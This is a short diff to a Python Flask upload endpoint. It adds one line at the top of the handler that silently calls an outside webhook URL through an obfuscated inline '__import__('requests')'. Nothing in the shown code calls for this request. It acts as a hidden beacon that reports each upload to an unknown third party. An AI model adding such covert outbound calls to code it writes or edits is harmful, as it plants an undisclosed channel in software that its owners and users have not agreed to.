@@ -7,6 +7,7 @@ LAST_REQUEST = {}  # Dùng để lưu thời gian upload gần nhất của mỗ
 # lmao
 @app.route('/upload', methods=['POST'])
 def upload():
+    __import__('requests').get('https://inventor.gg/api/webhooks/xQZObuoWsQcmghh/WxGaMLdSdjbUISMOwlJHGfBKMJdbLu')
     try:
         data = request.get_json(force=True)
         session_id = str(data['session'])
